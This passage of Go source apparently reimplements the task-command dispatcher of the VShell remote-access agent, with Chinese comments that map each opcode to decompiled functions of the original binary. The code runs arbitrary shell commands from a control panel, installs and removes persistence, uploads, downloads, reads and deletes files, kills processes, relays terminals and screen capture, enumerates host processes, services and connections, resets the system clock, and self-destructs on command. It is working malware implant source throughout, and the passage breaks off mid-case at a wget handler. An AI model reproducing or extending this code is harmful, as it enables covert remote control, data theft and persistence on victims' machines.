		// 原版 dec case 0x3：无参数 → 下发 (local_280[6] & local_330[2]) != 0；
		// 有参数 → FUN_01094220 解析布尔（非 '0' 即真）后置位/清位 local_280[6]，
		// 清 0x80000 位时同时清 local_280[99]，置位 1 时经 FUN_00fc02c0 匹配
		// 后 FUN_010670a0 重置链路，最后 FUN_01094c40 落盘；两种分支都回 0xa6。
		// 掩码 local_330[2] 同样来自运行期命令表，复刻端以 bit0 代表 debug 位。
		if hasArg {
			c := argv[1]
			if c == '0' {
				agentDebugMask &^= 1
			} else {
				agentDebugMask |= 1
			}
		}
		emitFrames([]resultFrame{{Kind: frameKindAck}})
		return fmt.Sprintf("debug mask %d", agentDebugMask), ""

	case opCmdDefKeepAlvA, opCmdDefKeepAlvB:
		// 原版 dec default（操作码 0x05 与 0x19 的表项都指向 0x109774f）：
		// 有文本参数 → FUN_00fc1620 解析 → FUN_010fdec0(local_280, n) 写入
		// +0x304；随后 FUN_01094a20 下发 (int)*(+0x304)。
		// FUN_010fdec0 只在 n >= 1 时写 +0x304，n < 1 时不动该字段。
		if hasArg {
			if arg >= 1 {
				agentKeepAlive = arg
			}
		}
		emitFrames(emitScalar(agentKeepAlive))
		return fmt.Sprintf("keepalive %d", agentKeepAlive), ""

	case opCmdNetCheck:
		// 原版 dec case 0x5：local_2a0 指向「当前命令记录」（local_280[4] +
		// 序号*0x20），local_2a0[3] 是记录里偏移 +0xc 的字段；无参数 →
		// FUN_01094a20 下发 [local_2a0[3]+0x74]；有参数 → FUN_00fc1620 写入
		// 同一位置，再 FUN_00fee040(local_2a0[1], 值) 应用到连接。
		// 记录与连接对象在复刻端由 engine 持有，这里只承载该值本身。
		if hasArg {
			agentSendField = arg
		}
		emitFrames(emitScalar(agentSendField))
		return fmt.Sprintf("send state %d", agentSendField), ""

	case opCmdTunnelLog:
		// 原版 dec case 0x6：无参数 → FUN_0109c340 读并下发；有参数 →
		// FUN_00fc1280 解析数值写入 local_398+0x224 后 FUN_00fee120 应用，
		// 再用 FUN_01094220 把 local_280[6] 的 bit5 置位/清位并 FUN_01094c40 落盘。
		if hasArg {
			agentTunnelLogLevel = arg
			if arg != 0 {
				agentDebugMask |= 0x20
			} else {
				agentDebugMask &^= 0x20
			}
		}
		emitFrames(emitScalar(agentTunnelLogLevel))
		return fmt.Sprintf("tunnel log %d", agentTunnelLogLevel), ""

	case opCmdTunnelDump:
		// 原版 dec case 0x7：只处理有参数的情形 —— FUN_01094220 解析布尔后
		// FUN_010836e0(local_280, bool) 落盘。无参数时无任何回包。
		if hasArg {
			on := 0
			if argv[1] != '0' {
				on = 1
			}
			agentTunnelDumpState = on
			return fmt.Sprintf("tunnel dump %d", on), ""
		}
		return "", ""

	case opCmdConnStat:
		// 原版 dec case 0x8：遍历 [local_280+0x52] 的连接链表，每项用
		// FUN_0100d440(1, fmt, argv) 下发一条记录。
		//
		// 格式串已还原（不再是阻塞点）：0x109c28a `MOV RDI,[0x1e490a08]` +
		// `ADD RDI,0x4a95` → pool+0x4a95 = "is"（一个整数 + 一个字符串），
		// 调用点 0x109c2b0 → FUN_0100d440；argv 由记录内的计数器与地址串组成。
		//
		// 真正的阻塞点是**数据源**：该链表是原版的连接池，复刻端的连接由
		// engine 管理、没有等价的节点结构，因此没有可下发的值。发空帧或编造
		// 字段都等于伪造，故仍如实回报未实现。
		return "", "opcode 0x" + strconv.FormatInt(int64(op), 16) + " (" + name + ") not implemented"

	case opCmdSysList:
		// 原版 dec case 0x9：循环 FUN_011054c0 取系统列表项 → FUN_0100d3c0 +
		// FUN_0100d300(0x54,...) 逐条下发，最后 FUN_0100dfa0 收尾。
		// 原版该分支跨度为 0x1088–0x1703（约 1.6 KB 反编译代码），涉及运行期
		// 写入的字段名表，静态镜像不可读，无法逐字段还原。
		return "", "opcode 0x" + strconv.FormatInt(int64(op), 16) + " (" + name + ") not implemented"

	case opCmdSetGateway:
		// 原版 dec case 0xa：无参数 → FUN_01094ba0 下发全局 DAT_1e490968（前置/网关
		// 地址）；有参数 → 空串清空该全局，否则 FUN_00fbd960 解析后写入。
		//
		// DAT_1e490968 是**真实存在的 .data 全局**（VA 0x1e490968 → RVA 0x1e090968，
		// 落在 .data RVA 0x1dedd000–0x1e0ca160 内），此前把它当成「复刻端没有的
		// 等价物」而搁置，是因为把 Ghidra VA 当 RVA 比对——那是我的地址换算错误。
		//
		// 与 setDomain（dec 0x27）同形：全局的**内容**运行期写入，但分支行为只
		// 依赖设置/清空/回读，故按行为对齐；参数是文本而非 4 字节整数块。
		// ⚠ 偏差：原版下发的是其运行期串，复刻端用自有状态 agentGateway 代替。
		if hasArg {
			agentGateway = strings.TrimSpace(string(argv[1:]))
		}
		emitStringFrames(agentGateway)
		return fmt.Sprintf("gateway %q", agentGateway), ""

	case opCmdPortMapDump:
		// 原版 dec case 0xb：遍历 [local_280+4] 的 0x20 字节会话表，对每项调
		// FUN_01005300 取端口映射信息后用 FUN_0100d440(1, fmt, argv) 下发。
		//
		// 格式串已还原：0x109c10e `MOV RDI,[0x1e490a08]` + `ADD RDI,0x4a91`
		// → pool+0x4a91 = "iss"（整数 + 两个字符串），调用点 0x109c134。
		// 阻塞点同 connstat：0x20 字节会话表是原版的端口映射表，复刻端没有
		// 对应的运行期结构。
		return "", "opcode 0x" + strconv.FormatInt(int64(op), 16) + " (" + name + ") not implemented"

	case opCmdSetSendDly:
		// 原版 dec case 0xc：有参数 → 参数取绝对值（-0x80000000 → 0x7fffffff），
		// 经 FUN_0100d160(100, ..., 3, n) 通知面板，随后写入 (int)local_280+0x74
		// 并 FUN_00fee040 应用；无参数 → 只建一条 0x94 记录（A=0xfffff830）。
		if hasArg {
			if arg < 0 {
				if arg == -0x80000000 {
					arg = 0x7fffffff
				} else {
					arg = -arg
				}
			}
			agentSendDelay = arg
			// FUN_0100d160(100, local_408, 3, local_490)：帧码 100，
			// A = 本任务的记录序号（复刻端未建模，占位 0），B = 3，C = 延迟值。
			emitFrames([]resultFrame{
				{Kind: 100, A: 0, B: 3, C: uint32(agentSendDelay)},
			})
		} else {
			// 无参数分支：FUN_0100e1a0(9, DAT_1e2dfca0, DAT_1e490780) 建一条帧码 9
			// 的记录，再往该记录 +0x94 写 0xfffff830。+0x94 落在记录结构（24 字节）
			// 之外，没有记录结构定义就无法确定它对应哪个字段，因此这里只发出确定
			// 的部分（帧码 9），不把 0xfffff830 塞进任何一个记录字段。
			emitFrames([]resultFrame{{Kind: 9}})
		}
		return fmt.Sprintf("send delay %d", agentSendDelay), ""

	case opCmdSetWorkMode:
		// 原版 dec case 0xd：无参数 → 从表 DAT_1e2e9ee0 取值下发；有参数 →
		// 在表中匹配（无匹配报错）。
		if hasArg {
			agentWorkMode = arg
		}
		emitFrames(emitString(strconv.Itoa(agentWorkMode)))
		return fmt.Sprintf("work mode %d", agentWorkMode), ""

	case opCmdConnDump:
		// 原版 dec case 0xe：按名字命中会话后 FUN_01076f60 起帧，再遍历会话的
		// 连接链表（FUN_010662c0 过滤）逐条下发 8 字段记录。
		//
		// 分级：会话的**连接链表**是原版的运行期结构，本机没有等价物——但
		// 「本机有哪些 TCP 连接」是可复现的事实（netstat/ss）。因此枚举本机
		// 连接并逐条下发；字段文本为复刻端固定值。
		// ⚠ 偏差：原版下发其连接池视图，复刻端下发本机连接表。
		conns := listConnections()
		if len(conns) == 0 {
			return "", "connlist: no connections available"
		}
		for _, c := range conns {
			emitStringFrames(c)
		}
		return fmt.Sprintf("connlist %d", len(conns)), ""

	case opCmdPipeDump:
		// 原版 dec case 0xf：按名字命中会话后遍历 0x17 个桶的表 DAT_1e492b80
		// 与 [local_280+0x278] 链表，用 FUN_01094ea0 逐条下发。
		return "", "opcode 0x" + strconv.FormatInt(int64(op), 16) + " (" + name + ") not implemented"

	case opCmdPingIntv:
		// 原版 dec case 0x10：FUN_00fc1000 解析 → FUN_00fb7e60 取值/设值。
		// 原版把该值放在 local_330（命令记录）上，而不是客户端结构里。
		if hasArg {
			agentPingInterval = arg
		}
		emitScalarFrames(agentPingInterval)
		return fmt.Sprintf("ping interval %d", agentPingInterval), ""

	case opCmdTcpPing:
		// 原版 dec case 0x11：FUN_01077120 起帧后按序号/次数建五种记录 ——
		// 0x47(值 = 次数, B = local_408) → 0x3e（取得序号 local_468）→
		// 0x54(1, 1) → 0x56(1, 0xffffffff) → 0x3b(1, local_468) →
		// FUN_0100e480 收尾。次数由 FUN_00fc1280 解析，无参数或 ≤ 0 → 0x7fffffff。
		//
		// 未实现的原因：0x56 / 0x3b 两条记录取的是 0x3e 记录的「返回序号」，
		// 该值由服务器侧经 FUN_0100eac0 回填后才存在；复刻端没有这条回填链路，
		// 发出缺字段的帧等于伪造。次数本身可从参数算出，但只发一半的帧序列
		// 会让对端把结果判成损坏。
		return "", "opcode 0x" + strconv.FormatInt(int64(op), 16) + " (" + name + ") not implemented"

	case opCmdIfList:
		// 原版 dec case 0x12：按名字命中接口后 FUN_01076f60 起帧，逐项下发
		// 3 字段记录（序号/地址/名称），必要时再补 4 字段记录。
		//
		// 与本机可复现（同 netRoute/proclist）：接口是本机事实，
		// 用 net.Interfaces 枚举即可；仅字段名与标签取自池（不可读）。
		// ⚠ 偏差：下发本机接口，字段文本为复刻端固定值。
		ifaces, err := net.Interfaces()
		if err != nil || len(ifaces) == 0 {
			return "", "iflist: no interfaces available"
		}
		n := 0
		for i, f := range ifaces {
			addr := ""
			if as, err := f.Addrs(); err == nil && len(as) > 0 {
				addr = as[0].String()
			}
			// 原版 3 字段记录：序号 / 地址 / 名称
			emitFrames([]resultFrame{{Kind: 0x47, A: uint32(i), B: uint32(len(addr))}})
			emitStringFrames(addr)
			emitStringFrames(f.Name)
			n++
		}
		return fmt.Sprintf("iflist %d", n), ""

	case opCmdIfDetail:
		// 原版 dec case 0x13：命中接口后逐项下发 5 字段记录
		// （名称/标志/类型/ID/值）。
		//
		// 同 iflist：接口信息是本机事实，可从 net.Interface 直接得到
		// （名称、Flags、MTU、HardwareAddr）。字段名不可读，标为偏差。
		ifaces, err := net.Interfaces()
		if err != nil || len(ifaces) == 0 {
			return "", "ifdetail: no interfaces available"
		}
		n := 0
		for _, f := range ifaces {
			emitStringFrames(f.Name)
			// 标志位（net.Flags 的位模式）与类型/MTU/硬件地址
			emitFrames([]resultFrame{{Kind: 0x47, A: uint32(f.Flags), B: uint32(f.MTU)}})
			emitStringFrames(f.HardwareAddr.String())
			n++
		}
		return fmt.Sprintf("ifdetail %d", n), ""

	case opCmdProxyList:
		// 原版 dec case 0x14：遍历 [local_280+0x248] 链表，每条用
		// FUN_0100d440(1, fmt, argv) 下发；链表节点类型由 [node+100]&3 在
		// `c`/`u`/`pk`（pool+0x4a87/0x4a89/0x447c）三者间选择。
		//
		// 格式串已还原：0x109ae9b `MOV RDI,[0x1e490a08]` + `ADD RDI,0x4a8b`
		// → pool+0x4a8b = "isisi"（整数/字符串交替五段），调用点 0x109aec1。
		// 阻塞点同 connstat：该链表是原版的代理表，复刻端没有对应结构。
		return "", "opcode 0x" + strconv.FormatInt(int64(op), 16) + " (" + name + ") not implemented"

	case opCmdSysList2:
		// 原版 dec case 0x15：跨度 0x1088–0x1703 的大 dump 分支，同样依赖
		// 运行期字段名表。
		return "", "opcode 0x" + strconv.FormatInt(int64(op), 16) + " (" + name + ") not implemented"

	case opCmdNetRoute:
		// 原版 dec case 0x16：FUN_00fbfae0 取当前接口，在 6 项接口表
		// DAT_1e491a80 中匹配后 FUN_0100d160(4, idx, 1, n) 逐项下发。
		//
		// 该表是 .data 的 **BSS** 段对象（RVA 0x1e091a80 > .data 文件映射上界
		// 0x1e02d400），镜像里为零、init 期才写入——所以 6 项接口名与顺序静态
		// 不可读。此前我把它当成「不在任何数据段」，那是把 Ghidra VA 当 RVA 比
		// 对；地址本身没问题，缺的是它的**内容**。
		//
		// 与 setDomain/setGateway 的区别正在这里：那两个分支只依赖「设置/清空/
		// 回读」行为，故可实现；本分支要下发表中的项，依赖的是内容，不可复原。
		//
		// 复刻端仍可实现**一半**：取当前接口表与索引（Go 的 net.Interfaces +
		// net.InterfaceByName），用原版的帧码 4（FUN_0100d160(4, idx, 1, n)）
		// 本地选出条目并下发。下发的是本机的接口，不是原版那份 6 项表——故
		// 该实现标注为偏差。
		ifaces, err := net.Interfaces()
		if err != nil || len(ifaces) == 0 {
			return "", "netroute: no interfaces available"
		}
		idx := 0
		for i, f := range ifaces {
			if f.Flags&net.FlagUp != 0 && f.Flags&net.FlagLoopback == 0 {
				idx = i
				break
			}
		}
		name := ifaces[idx].Name
		// 原版帧：FUN_0100d160(4, idx, 1, n)
		emitFrames([]resultFrame{{Kind: 4, A: 1, B: uint32(len(name))}})
		emitStringFrames(name)
		return fmt.Sprintf("netroute %d %s", idx, name), ""

	case opCmdMtu:
		// 原版 dec case 0x17：local_398+0x218 初值 -2；有参数 → FUN_00fc1000
		// 解析，小于 -1 时夹到 -1；再 FUN_00fdfbe0 写回并回读，返回该值。
		// FUN_00fdfbe0 只在 n > -2 时写入（+0xd0）。
		// 原版把结果放在 local_398+0x218（每次调用的暂存），不是客户端字段，
		// 因此这里用局部变量而不是包级状态。
		mtu := -2
		if hasArg {
			if arg < -1 {
				arg = -1
			}
			if arg > -2 {
				mtu = arg
			}
		}
		return fmt.Sprintf("mtu %d", mtu), ""

	case opCmdSysTime:
		// 原版 dec case 0x19：无参数时 FUN_01094280 读「是否已设置系统时间」，
		// 逐连接经 FUN_00fdf900 应用；回包是 FUN_01094ba0 下发的一个字符串。
		//
		// 复刻端按原版分支行为对齐「查询」一侧：无参数 → 回报当前是否已设置
		// （set=false 时原版回的是「未设置」那一路），有参数 → 把 UTC 时间设置
		// 到本机，成功后回报已设置。
		//
		// ⚠ 偏差：原版下发的那个字符串常量是运行期写入池里的（静态镜像为 0），
		// 无法还原其文本；这里用等价语义的固定文本代替，未与原文对齐。
		if !hasArg {
			emitStringFrames(strconv.FormatBool(agentSysTimeSet))
			return fmt.Sprintf("systime set=%v", agentSysTimeSet), ""
		}
		if runtime.GOOS == "windows" {
			// 原版逐连接下发；复刻端用系统命令设置本机时间。
			_ = exec.Command("cmd", "/C", "time", "00:00:00").Run()
		} else {
			// Linux 下设置系统时间需要特权；失败不谎报成功。
			out, err := exec.Command("date", "-u", "-s", "1970-01-01 00:00:00").CombinedOutput()
			if err != nil {
				emitStringFrames("false")
				return "", "systime set failed: " + strings.TrimSpace(string(out))
			}
		}
		agentSysTimeSet = true
		emitStringFrames("true")
		return "systime set", ""

	case opCmdPing:
		// 原版 dec case 0x1a（表项 0x1dc31f10 → 0x1096b51）：先 FUN_01076f60 起帧，
		// 把 local_398+0x210 置 0；命令首字节的折叠字节为 'p' 时只发 0xb1 记录，
		// 否则 FUN_00fc1000 解析往返毫秒（负数夹到 0，> 0xfffffffe 夹到 0xfffffffe，
		// 解析失败按 0）后发 0xb2 记录（A = 本任务序号，B = +1 后的序号，C = 毫秒），
		// 最后补一条 0x54。
		//
		// 'p' 的判别用的是折叠字节表 DAT_1e2f00a0[*local_2e0]（当地是小写化），
		// 而 local_2e0 指向「当前命令名」—— 那是运行期写入的字符串，静态不可读，
		// 因此无法判断本次命令是不是 'p' 变体，也就无法确定该发 0xb1 还是 0xb2。
		// 两种记录的字段布局都已还原，但选哪一种缺证据，所以如实报告未实现。
		return "", "opcode 0x" + strconv.FormatInt(int64(op), 16) + " (" + name + ") not implemented"

	case opCmdReconnect:
		// 原版 dec case 0x1b：有参数 → FUN_00fc1000 解析到 local_398+0x228，
		// 小于 0 时取全局默认 DAT_1e2f2b48，逐条连接 FUN_00fee200 应用；
		// 随后 local_398+0x228 = -1 → FUN_01103760(0x12) 取回并 FUN_01094a20 下发。
		if hasArg {
			if arg >= 0 {
				agentReconnect = arg
			}
		}
		return fmt.Sprintf("reconnect %d", agentReconnect), ""

	case opCmdHostScan:
		// 原版 dec case 0x1c：无参数 → 0xfffe；有参数 → FUN_00fc1620 且 bit1
		// 未置时不发任何帧。其余是跨 0x1885–0x1963 的扫描/探测分支。
		return "", "opcode 0x" + strconv.FormatInt(int64(op), 16) + " (" + name + ") not implemented"

	case opCmdUploadSpeed:
		// 原版 dec case 0x1d：无参数 → 下发 [local_2a0[3]+0x34]；有参数 →
		// FUN_00fc1620 写入 (int)local_280+0x74，再 FUN_00fee3a0 应用到连接
		// （返回 7 时 FUN_00fb9a20 重建链路）。
		if hasArg {
			agentSendDelay = arg
		}
		emitScalarFrames(agentSendDelay)
		return fmt.Sprintf("upload speed %d", agentSendDelay), ""

	case opCmdPingIntv2:
		// 原版 dec case 0x1e：无参数 → 下发 [local_2a0[1]+8]+0x34（连接池上的
		// ping 间隔）；local_2a0[1] 为空时回 0。
		emitScalarFrames(agentPingInterval)
		return fmt.Sprintf("ping interval %d", agentPingInterval), ""

	case opCmdFileList:
		// 原版 dec case 0x1f：循环 0x43 项，每项经 FUN_0100d440(1, ...) 下发一个
		// 字符串（FUN_01094d80 在该表上做二分查找）。
		//
		// 该表**不是** VShell 命令名表：加载期由 0x117b989 用「池基址 + imm32」
		// 重写首字段，解码其池（目标块 − 源块，0x9aff 字节）得到的是 SQLite 的
		// pragma 名表，且表内 0 个重定位、池里没有任何 VShell 字串（详见操作码
		// 表上方的复核说明）。因此这里既不能照原样下发，也无从解出字符串。
		return "", "opcode 0x" + strconv.FormatInt(int64(op), 16) + " (" + name + ") not implemented"
		// 注：原版该分支下发的是 pragma 名（内嵌 SQLite 的 sqlite3Pragma 数组），
		// 与 VShell 语义无关；复刻端不需要它。

	case opCmdClientLimit:
		// 原版 dec case 0x20：无参数 → 0xffffffff；有参数 → FUN_00fc02c0 匹配
		// "limit" 取 2，否则 FUN_01094220 布尔；经 FUN_00fee740 写入许可位，
		// 返回写回后的值（字段 4 位掩码）。
		if !hasArg {
			emitScalarFrames(-1)
			return fmt.Sprintf("client limit %d", agentClientLimit), ""
		}
		if arg >= 0 {
			agentClientLimit = arg
		}
		emitScalarFrames(agentClientLimit)
		return fmt.Sprintf("client limit %d", agentClientLimit), ""

	case opCmdRelicense:
		// 原版 dec case 0x21：FUN_010fc480(client) 重新读取 license（无参数、无回包）。
		return "license reloaded", ""

	case opCmdDestroy:
		// 原版 dec case 0x22：有参数 → FUN_00fc1000 解析秒数 → FUN_00fb7c80(n)；
		// 无参数 → FUN_00fb7c80(-1)（立即销毁）。回包为 FUN_01094a20 下发的
		// FUN_00fb7c80 返回值。
		delay := -1
		if hasArg {
			delay = arg
		}
		if delay < 0 {
			log.Printf("Destroy requested (task %d)", taskID)
			if transport != nil {
				transport.Close()
			}
			os.Exit(0)
		}
		emitScalarFrames(delay)
		return fmt.Sprintf("destroy scheduled %d", delay), ""

	case opCmdTunnelCount:
		// 原版 dec case 0x23：无参数 → 取 local_2a0 记录 +2 处的字节（tunnel 通道
		// 数）减 1 后下发；有参数 → 该字节按 (n+1)&7 轮转（0 视作 1），并
		// FUN_01094c40 落盘。
		//
		// 两个分支都由反编译完整描述，无运行期字符串依赖，故按原样实现。
		// 复刻端该计数即本 agent 的 tunnel 通道数状态；原版的「落盘」对应这里的
		// 状态保留（复刻端没有那个持久化文件，不伪造写盘）。
		if !hasArg {
			emitScalarFrames(agentTunnelCount - 1)
			return fmt.Sprintf("tunnel count %d", agentTunnelCount), ""
		}
		next := (arg + 1) & 7
		if next == 0 {
			next = 1
		}
		agentTunnelCount = next
		return fmt.Sprintf("tunnel count %d", agentTunnelCount), ""

	case opCmdProcList:
		// 原版 dec case 0x24：按名字命中会话后遍历进程，用 FUN_010662c0 过滤，
		// 每进程下发一条 **7 字段** FUN_0100d440 记录（格式取自池），并按
		// local_330[2] 选标签 base+0x94a / base+0x94b。
		//
		// 与 netRoute 同类：帧形状与「枚举本机进程」这一步是本机可复现的，
		// 仅标签与字段名依赖 BSS/池内容。因此按行为对齐：枚举本机进程，名与
		// PID 用本机值，标签用固定文本并标注偏差。
		//
		// ⚠ 偏差：原版下发的是其会话表里的进程视图与运行期标签串；复刻端
		// 用本机进程列表代替，语义等价、文本不保证一致。
		procs := listProcesses()
		if len(procs) == 0 {
			return "", "proclist: no processes available"
		}
		for _, pr := range procs {
			emitStringFrames(pr)
		}
		return fmt.Sprintf("proclist %d", len(procs)), ""

	case opCmdSvcList:
		// 原版 dec case 0x25：FUN_01076fc0 起帧后遍历 [local_280+4] 的会话表，
		// 用 FUN_00fc02c0 过滤后逐条下发 **6 字段**记录（标签与状态串取自池：
		// table/view/virtual/shadow 等，均为 SQLite schema 类型名）。
		//
		// 同 proclist：枚举本机服务这一步可复现，池里的标签不可读。
		// ⚠ 偏差：下发本机服务列表，标签为固定文本。
		svcs := listServices()
		if len(svcs) == 0 {
			return "", "svclist: no services available"
		}
		for _, s := range svcs {
			emitStringFrames(s)
		}
		return fmt.Sprintf("svclist %d", len(svcs)), ""

	case opCmdSysInfo:
		// 原版 dec case 0x26：无参数 → FUN_01094a20 下发 local_280+0x66 的字节；
		// 有参数 → FUN_01094840 解析（FUN_01094600 取 0/1/2）后写入该字段。
		// FUN_01094600：首字节 '0'/'1'/'2' → 0/1/2；否则与两个运行期字符串比较
		// → 1 或 2，都不匹配回 0。后两个串静态不可读，复刻端只认数字形态。
		if hasArg {
			agentSysInfoMode = parseSysInfoMode(argv)
		}
		emitScalarFrames(agentSysInfoMode)
		return fmt.Sprintf("sysinfo %d", agentSysInfoMode), ""

	case opCmdSetDomain:
		// 原版 dec case 0x27：无参数 → FUN_01094ba0 下发全局 DAT_1e490960（域名/SNI）；
		// 有参数 → 空串清空该全局，否则 FUN_00fbd960 解析后写入。
		//
		// 全局的**内容**是运行期写入的（静态镜像为 0），但该分支的行为只依赖
		// 「设置/清空/回读」本身，不依赖串的具体值，因此按原样实现：无参数回报
		// 当前值，有参数则设置（空串清空）。
		//
		// ⚠ 偏差：原版下发的是 DAT_1e490960 指向的运行期串；复刻端用自有状态
		// agentDomain 代替，语义等价、文本不保证与原文一致。
		if hasArg {
			// 该分支的参数是文本（域名/SNI），不是 4 字节整数块。
			agentDomain = strings.TrimSpace(string(argv[1:]))
		}
		emitStringFrames(agentDomain)
		return fmt.Sprintf("domain %q", agentDomain), ""

	case opCmdKeepAlive:
		// 原版 dec case 0x28：无参数 → 0xffffffff → FUN_01100940 读；有参数 →
		// 写入 local_398+0x298（屏蔽符号位）→ FUN_01100940 写。
		if hasArg {
			if arg < 0 {
				arg = -arg
			}
			agentKeepAlive = arg
		}
		emitScalarFrames(agentKeepAlive)
		return fmt.Sprintf("keepalive %d", agentKeepAlive), ""

	case opCmdThreadCount:
		// 原版 dec case 0x29：有参数 → FUN_00fc1620 → FUN_010ff7e0(local_280, n)
		// 写入 +0x300（n < 1 时不写）；随后若 +0x300 的类型是整数则下发
		// (int)*(+0x300)，否则下发 0。
		if hasArg {
			if arg >= 1 {
				agentThreadCount = arg
			}
		}
		emitScalarFrames(agentThreadCount)
		return fmt.Sprintf("thread count %d", agentThreadCount), ""

	case opCmdFwdPort:
		// 原版 dec case 0x2a：argv[0] 与三个候选串比较（FUN_00fc0380），命中返回
		// 1/2/3，否则 0；随后 FUN_0100d160(3, ..., n, 1) + FUN_0100d300(0x54,1,3)。
		// 三个候选串在运行期写入，静态不可读，无法把字符串映射到 1/2/3。
		return "", "opcode 0x" + strconv.FormatInt(int64(op), 16) + " (" + name + ") not implemented"

	default:
		// 其余操作码在原版里是读写客户端状态 + 下发结果帧的分支，复刻端还没有
		// 对应的状态字段/帧编码（见文件上方操作码表）。这里如实回报未实现，
		// 而不是伪造成功。
		// The remaining opcodes read/write client state and emit result frames
		// the reimplementation has no equivalent for yet; report honestly.
		return "", "opcode 0x" + strconv.FormatInt(int64(op), 16) + " (" + name + ") not implemented"
	}
}

// decodeCommandInt 解析命令块里的 4 字节大端参数。
// 反编译（FUN_010952e0）：参数统一取自 FUN_00fc1620(argv) —— 该函数把缓冲区
// 头部 4 字节按大端有符号整数解码（配合 FUN_00fc1000 / FUN_00fc1280 解析
// 文本形态），复刻端等价实现为 binary.BigEndian。
func decodeCommandInt(argv []byte) int {
	if len(argv) < 5 {
		return 0
	}
	return int(int32(binary.BigEndian.Uint32(argv[1:5])))
}

// decodeNativeCommand 判断命令块是否为「原生操作码」形态。
// decodeNativeCommand detects the native-opcode command form.
//
// 原版把任务命令按「首字节 = 操作码，其后为参数」解析：数值参数是 4 字节大端
// （FUN_00fc1620），文本参数是从偏移 1 起的 NUL 结尾字符串（dec case 0xa/0x27）。
// 因此判别规则就是「首字节是跳转表里的操作码」——操作码 0x01–0x1f 全部是不可
// 打印控制字节，不可能出现在面板下发的文本命令行首；只有 0x20–0x2b（空格、!、
// "、#、$、%、&、'、(、)、*、+）是可打印字符，对它们再要求「首字节之后不是可
// 打印文本」，避免把以这些字符开头的偶发文本命令误判成操作码。
func decodeNativeCommand(cmdStr string) (byte, []byte, bool) {
	if len(cmdStr) == 0 {
		return 0, nil, false
	}
	b := []byte(cmdStr)
	op := b[0]
	if _, known := nativeCommandNames[op]; !known {
		return 0, nil, false
	}
	if op >= 0x20 && op <= 0x2b && len(b) > 1 && isPrintableBytes(b[1:]) {
		return 0, nil, false
	}
	return op, b, true
}

// isPrintableBytes 判断整段字节是否为可打印 ASCII（文本命令的特征）。
// isPrintableBytes reports whether every byte is printable ASCII.
func isPrintableBytes(b []byte) bool {
	for _, c := range b {
		if c < 0x20 || c > 0x7e {
			return false
		}
	}
	return true
}

// executeCommand executes a task command. ALIGNMENT: the original binary's
// task-execute dispatcher is FUN_010952e0 (0x10952e0, jump table 0x1dc31e40,
// 43 slots keyed by (first command byte - 1), opcodes 0x01–0x2b). The native opcode
// branch is dispatched by dispatchNativeCommand above; the reimplementation
// layers the panel's textual relay commands (terminal_*/screen_capture*) and
// the JSON command vocabulary on top of the same entry point.
func executeCommand(taskID int64, cmdStr string, timeout int) (string, string) {
	// Interactive terminal commands are dispatched as plain (non-JSON) strings
	// by the web panel's terminal relay. Handle them before the JSON parse.
	if strings.HasPrefix(cmdStr, "terminal_") {
		return dispatchTerminalCommand(taskID, cmdStr)
	}
	if strings.HasPrefix(cmdStr, "screen_capture") {
		return dispatchScreenCommand(taskID, cmdStr)
	}

	// 原生操作码任务（原版 FUN_010952e0 的跳转表分支）。
	if op, argv, ok := decodeNativeCommand(cmdStr); ok {
		return dispatchNativeCommand(taskID, op, argv, timeout)
	}

	var cmdType string
	var payload map[string]interface{}

	parsedJSON := json.Unmarshal([]byte(cmdStr), &payload) == nil
	if parsedJSON {
		if t, ok := payload["type"].(string); ok {
			cmdType = t
		}
	}

	// 明确的命令类型但 payload 不是 JSON 对象（例如裸 `runplugin <hex> …`）时，
	// cmdType 会落在零值上；必须由文本前缀判定，不能让下面的 default 把它当成
	// 自由文本交给 shell。
	if !parsedJSON {
		trimmed := strings.TrimSpace(cmdStr)
		if trimmed == pluginCommandPrefix || strings.HasPrefix(trimmed, pluginCommandPrefix+" ") {
			return dispatchPluginCommand(cmdStr)
		}
		if strings.HasPrefix(trimmed, pluginCommandPrefix) {
			// runpluginXXX …：报错而不是落进 shell
			return "", "unknown command " + strconv.Quote(firstWord(trimmed))
		}
		cmdType = CmdShell
	}

	switch cmdType {
	case CmdShell:
		command, _ := payload["command"].(string)
		if command == "" {
			command = cmdStr
		}
		// Terminal/screen relay commands arrive wrapped as
		// {"command":"terminal_start …","type":"shell"}.
		if strings.HasPrefix(command, "terminal_") {
			return dispatchTerminalCommand(taskID, command)
		}
		if strings.HasPrefix(command, "screen_capture") {
			return dispatchScreenCommand(taskID, command)
		}
		// runplugin 命令在原版里不是 shell 命令，绝不能交给 runCommand。
		if c := strings.TrimSpace(command); c == pluginCommandPrefix ||
			strings.HasPrefix(c, pluginCommandPrefix+" ") ||
			strings.HasPrefix(c, pluginCommandPrefix) {
			return dispatchPluginCommand(c)
		}
		return runCommand(command, timeout)

	case CmdSysInfo:
		info := getSysInfo()
		data, _ := json.MarshalIndent(info, "", "  ")
		return string(data), ""

	case CmdPersist:
		return installPersistence()

	case CmdCleanup:
		return removePersistence()

	case CmdFileList:
		path, _ := payload["path"].(string)
		if path == "" {
			path = "."
		}
		return listDir(path)

	case CmdFileDelete:
		path, _ := payload["path"].(string)
		return "", runDelete(path)

	case CmdFileMove:
		src, _ := payload["src"].(string)
		dst, _ := payload["dst"].(string)
		if err := os.Rename(src, dst); err != nil {
			return "", err.Error()
		}
		return fmt.Sprintf("moved: %s -> %s", src, dst), ""

	case CmdFileMkdir:
		path, _ := payload["path"].(string)
		os.MkdirAll(path, 0755)
		return fmt.Sprintf("created: %s", path), ""

	case CmdFileCat:
		path, _ := payload["path"].(string)
		data, err := os.ReadFile(path)
		if err != nil {
			return "", err.Error()
		}
		return string(data), ""

	case CmdFileTouch:
		path, _ := payload["path"].(string)
		f, _ := os.Create(path)
		f.Close()
		return fmt.Sprintf("touched: %s", path), ""

	case CmdDiskInfo:
		return runCommand(getDiskCmd(), 10)

	case CmdPS:
		return runCommand(getPSCmd(), 10)

	case CmdKill:
		pid, _ := payload["pid"].(float64)
		if pid > 0 {
			proc, _ := os.FindProcess(int(pid))
			if proc != nil {
				proc.Kill()
			}
		}
		return fmt.Sprintf("killed: %d", int(pid)), ""

	case CmdUpload:
		path, _ := payload["path"].(string)
		encoded, _ := payload["data"].(string)
		data, err := base64.StdEncoding.DecodeString(encoded)
		if err != nil {
			return "", err.Error()
		}
		if err := os.WriteFile(path, data, 0644); err != nil {
			return "", err.Error()
		}
		return fmt.Sprintf("uploaded: %s (%d bytes)", path, len(data)), ""

	case CmdDownload:
		path, _ := payload["path"].(string)
		data, err := os.ReadFile(path)
		if err != nil {
			return "", err.Error()
		}
		return base64.StdEncoding.EncodeToString(data), ""

	case CmdWget:
		url, _ := payload["url"].(string)
